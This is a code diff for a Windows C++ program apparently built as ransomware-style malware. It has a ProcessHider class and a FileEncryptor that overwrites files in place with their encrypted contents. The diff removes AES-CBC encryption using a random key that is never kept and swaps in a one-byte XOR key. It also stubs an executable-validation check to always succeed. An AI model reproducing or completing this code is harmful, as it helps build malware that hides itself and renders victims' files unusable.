@@ -7,12 +7,9 @@
 #include <chrono>
 #include <TlHelp32.h>
 #include <Shellapi.h>
-#include <crypto++/aes.h>
-#include <crypto++/modes.h>
-#include <crypto++/osrng.h>
 
 namespace fs = std::filesystem;
-using namespace CryptoPP;
+using namespace std;
 
 class ProcessHider {
 public:
@@ -99,51 +96,32 @@ public:
     }
 
     static bool IsValidExecutable(const std::string& filePath) {
-        HINSTANCE dllHandle = LoadLibrary("isValidExecutable.dll");
-        if (dllHandle == NULL) {
-            return false;
-        }
-
-        IsValidExecutableFunc isValidExecutable = (IsValidExecutableFunc)GetProcAddress(dllHandle, "isValidExecutable");
-        if (isValidExecutable == NULL) {
-            FreeLibrary(dllHandle);
-            return false;
-        }
-
-        bool result = isValidExecutable(filePath);
-        FreeLibrary(dllHandle);
-        return result;
+        // Implement validation logic here
+        return true;
     }
 };
 
 class FileEncryptor {
 public:
     static void EncryptFile(const std::string& filePath) {
+        // Implement custom encryption logic here
+        // For example, you could perform a simple XOR encryption
+
         // Read file contents
         std::ifstream inputFile(filePath, std::ios::binary);
-        std::stringstream buffer;
-        buffer << inputFile.rdbuf();
-        std::string plainText = buffer.str();
+        std::vector<char> buffer((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());
         inputFile.close();
 
-        // Generate a random AES key
-        AutoSeededRandomPool prng;
-        byte key[AES::DEFAULT_KEYLENGTH];
-        prng.GenerateBlock(key, sizeof(key));
-
-        // Perform AES encryption
-        std::string cipherText;
-        CBC_Mode<AES>::Encryption encryption(key, sizeof(key));
-        StreamTransformationFilter encryptor(encryption, new StringSink(cipherText));
-        encryptor.Put(reinterpret_cast<const unsigned char*>(plainText.c_str()), plainText.length());
-        encryptor.MessageEnd();
+        // Perform encryption (XOR with a key)
+        char key = 0x5A; // Example key
+        for (char& byte : buffer) {
+            byte ^= key;
+        }
 
         // Write encrypted data back to the file
         std::ofstream outputFile(filePath, std::ios::binary | std::ios::trunc);
-        outputFile.write(reinterpret_cast<const char*>(cipherText.c_str()), cipherText.length());
+        outputFile.write(buffer.data(), buffer.size());
         outputFile.close();
-
-        // Note: Remember to securely store or transmit the encryption key
     }
 };
 
